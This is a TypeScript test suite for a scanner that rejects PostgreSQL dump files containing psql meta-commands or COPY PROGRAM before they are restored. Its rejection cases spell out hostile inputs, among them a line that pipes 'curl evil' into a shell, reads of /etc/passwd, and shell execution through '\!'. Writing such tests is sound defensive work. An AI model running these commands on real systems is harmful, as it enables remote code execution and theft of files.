import { mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { describe, expect, it } from "vitest";
import {
  assertSafeDumpFile,
  assertSafeDumpText,
  scanDump,
  UnsafeDumpError,
} from "../src/safe-dump";
import { psqlArgs } from "../src/restore";

const ok = (sql: string) => expect(assertSafeDumpText(sql)).resolves.toBeUndefined();
const bad = (sql: string) =>
  expect(assertSafeDumpText(sql)).rejects.toBeInstanceOf(UnsafeDumpError);

const REAL_DUMP = [
  "--",
  "-- PostgreSQL database dump",
  "--",
  "",
  "\\restrict AbC123xyz",
  "",
  "SET statement_timeout = 0;",
  "SET client_encoding = 'UTF8';",
  "SET standard_conforming_strings = on;",
  "SELECT pg_catalog.set_config('search_path', '', false);",
  "CREATE TABLE public.t (",
  "    id uuid NOT NULL,",
  "    name text DEFAULT 'a\\b'::text CHECK (name ~ '^\\d+$')",
  ");",
  "CREATE FUNCTION public.f() RETURNS text LANGUAGE sql AS $$ select E'\\n\\! not a command' $$;",
  "COMMENT ON TABLE public.t IS 'it''s -- not a comment \\! either';",
  "COPY public.t (id, name) FROM stdin;",
  "1\tx\\\\y",
  "\\N\tz",
  "\\.",
  "SELECT pg_catalog.setval('public.s', 1, true);",
  "\\unrestrict AbC123xyz",
  "",
].join("\n");

describe("DumpScanner: accepts what pg_dump writes", () => {
  it("a real-shaped dump, with LF and with CRLF", async () => {
    await ok(REAL_DUMP);
    await ok(REAL_DUMP.replace(/\n/g, "\r\n"));
  });
  it("backslashes inside strings, dollar quotes and comments", async () => {
    await ok("-- \\! id\nselect 1; /* \\! id */\n");
    await ok("select E'it\\'s';\n");
    await ok("select E'\\'; \\! id --';\n"); // all inside one E'' string, as psql reads it
    await ok('create table "std\\in" (a int);\n');
    await ok("select 1 /* a /* \\! */ \\! */;\n");
    await ok("select 'a'\n, 'b';\n");
  });
  it("COPY data with \\N, tabs and backslashes; multi-line dollar-quoted bodies", async () => {
    await ok("COPY public.t (a, b) FROM stdin;\n1\t\\N\n\\\\\t\\t\\n\n\\.\nselect 1;\n");
    await ok(
      "CREATE FUNCTION f() RETURNS text AS $body$\nselect '\\! id';\n\\! inside body\n$body$ LANGUAGE sql;\n",
    );
    await ok("create table t (\n\ta int,\n\tcopy text\n);\n"); // a column named copy
  });
  it("a file read in tiny chunks gives the same verdict", async () => {
    const chunks = (s: string) =>
      (async function* () {
        for (const c of s) yield c;
      })();
    await expect(scanDump(chunks(REAL_DUMP))).resolves.toBeUndefined();
    await expect(scanDump(chunks(REAL_DUMP + "\\! id\n"))).rejects.toBeInstanceOf(UnsafeDumpError);
  });
});

describe("DumpScanner: refuses psql meta-commands", () => {
  it("at the start of a line, mid-line, and after a COPY block", async () => {
    await bad("select 1;\n\\! touch /tmp/pwned\n");
    await bad("select 1 \\! id;\n");
    await bad("COPY public.t (a) FROM stdin;\n1\n\\.\n\\! id\n");
    await bad("\\copy t from '/etc/passwd'\n");
    await bad("select 1;\n\\gset\n");
  });
  it("the other meta-commands, doubled backslashes, ';' glued to the command, CRLF", async () => {
    await bad("\\! id\n");
    await bad("select 1;\n\\i /etc/passwd\n");
    await bad("select 1;\n\\o /tmp/out\n");
    await bad("\\copy t to program 'id'\n");
    await bad("\\copy (select 1) to program 'curl evil | sh'\n");
    await bad("\\c otherdb\n");
    await bad("\\connect otherdb\n");
    await bad("\\set ON_ERROR_STOP off\n");
    await bad("\\\\! id\n");
    await bad("select 1;\\! id\n");
    await bad("select 1;\\\\! id\n");
    await bad("select 1;\r\n\\! id\r\n");
    await bad("select 1;\r\n\\copy t from program 'id'\r\n");
    await bad("select 1;\n  \\! id\n"); // indented
    await bad("select 1;\n\t\\! id\n");
  });
  it("server-side COPY to a program or a file", async () => {
    await bad("COPY t FROM PROGRAM 'id';\n");
    await bad("COPY t TO PROGRAM 'id';\n");
    await bad("COPY t FROM '/etc/passwd';\n");
    await bad("COPY t TO '/tmp/x';\n");
    await bad("copy (select 1) to program 'id';\n");
    await bad("select 1; COPY t FROM PROGRAM 'id';\n");
    await bad("COPY t\n  FROM PROGRAM 'id';\n");
    await bad("COPY public.t (a) FROM stdin;\n1\n\\.\nCOPY t TO '/tmp/x';\n");
  });
  it("lookalikes of the allowed pg_dump lines", async () => {
    await bad("\\restrict abc \\! id\n");
    await bad("select 1\n\\restrict abc\n;\n");
    await bad("\\unrestrict abc;\n");
    await bad("COPY public.t (a) FROM stdin;\n1\n\\. \n\\! id\n");
    await bad("COPY public.t (a) FROM stdin;\n1\n\\.x\n");
  });
  it("a standard string closed by a backslash does not hide the next command", async () => {
    await bad("select '\\'; \\! id --';\n");
  });
});

describe("DumpScanner: refuses constructs that could desync it from psql", () => {
  it("COPY that is not a one-line statement start", async () => {
    await bad("COPY public.t (a)\nFROM stdin;\n\\! id\n");
    await bad("CREATE TABLE t (\nCOPY public.t (a) FROM stdin;\n\\! id\n");
    await bad("select 1; COPY public.t (a) FROM stdin;\n\\! id\n");
    await bad("select 'x\nCOPY public.t (a) FROM stdin;\n';\n\\! id\n"); // not at a statement start
  });
  it("BEGIN ATOMIC bodies", async () => {
    await bad(
      "CREATE FUNCTION f() RETURNS int LANGUAGE sql BEGIN ATOMIC SELECT 1; COPY t FROM stdin; END;\n\\! id\n",
    );
    await bad("CREATE FUNCTION f() RETURNS int LANGUAGE sql BEGIN\nATOMIC SELECT 1; END;\n");
  });
  it("string continuation across lines, NUL bytes, and settings that change the lexer", async () => {
    await bad("select 'a'\n'b';\n");
    await bad("select 1;\0\\! id\n");
    await bad("SET standard_conforming_strings = off;\n");
    await bad("select set_config('client_encoding', 'SJIS', false);\n");
    await bad("SET client_encoding = 'SJIS';\n");
    await ok("SET client_encoding = 'UTF8';\nSET standard_conforming_strings = on;\n");
  });
  it("a file that ends inside a string, a comment, or COPY data", async () => {
    await bad("select 'abc\n");
    await bad("select 1 /* open\n");
    await bad("COPY public.t (a) FROM stdin;\n1\n");
  });
});

describe("assertSafeDumpFile", () => {
  it("reads the file and reports the line", async () => {
    const dir = mkdtempSync(join(tmpdir(), "forgecy-dump-"));
    try {
      const file = join(dir, "db.sql");
      writeFileSync(file, "select 1;\nselect 2;\n\\! id\n");
      await expect(assertSafeDumpFile(file, { chunkSize: 5 })).rejects.toMatchObject({ line: 3 });
      writeFileSync(file, REAL_DUMP);
      await expect(assertSafeDumpFile(file)).resolves.toBeUndefined();
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });
});

describe("psqlArgs", () => {
  it("runs as one transaction that stops at the first error, without ~/.psqlrc", () => {
    const args = psqlArgs("/tmp/db.sql", "postgres://u:p@h/db");
    expect(args).toEqual(
      expect.arrayContaining([
        "-X",
        "--single-transaction",
        "-v",
        "ON_ERROR_STOP=1",
        "-f",
        "/tmp/db.sql",
      ]),
    );
    expect(args.at(-1)).toBe("postgres://u:p@h/db");
  });
});
